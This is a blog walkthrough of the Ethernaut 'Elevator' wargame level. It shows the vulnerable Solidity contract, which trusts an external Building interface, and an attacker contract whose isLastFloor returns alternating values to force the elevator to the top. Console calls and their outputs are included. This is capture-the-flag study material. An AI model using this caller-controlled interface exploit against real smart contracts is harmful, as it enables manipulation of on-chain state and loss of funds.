---
layout: post
title: Ethernaut - 11. Elevator
date:  2022-08-29
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌑🌑🌑
> This elevator won't let you reach the top of your building. Right? <br /><br />
  Things that might help: 
  - Sometimes solidity is not good at keeping promises.
  - This Elevator expects to be used from a Building.

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { 
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Writeup
1. Get new instance.
2. Call methods
    ``` javascript
    await contract.top()
    // false
    await contract.floor().then(v=>v.toString())
    // 0
    ```
3. Create a contract which implement `isLastFloor`.
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import './11_Elevator.sol'; // level instance contract

    contract ElevatorAttack {
        bool result = true;
        function isLastFloor(uint) external returns (bool) {
            result = !result; 
            return(result); 
            // first time return false, second time return true 
        }

        function gogo(address _addr,uint _floor) public {
            Elevator elevator = Elevator(_addr);
            elevator.goTo(_floor);
        }
    }
    ```
4. Call `gogo` method
    <img src="https://i.imgur.com/vsuzhmx.png" style="width:300px;" >
5. Call methods
    ``` javascript 
    await contract.top()
    // true
    await contract.floor().then(v=>v.toString())
    // 10
    ```
6. Submit instance ξ( ✿＞◡❛)

## Reference
- [Solidity by example - Interface](https://solidity-by-example.org/interface/)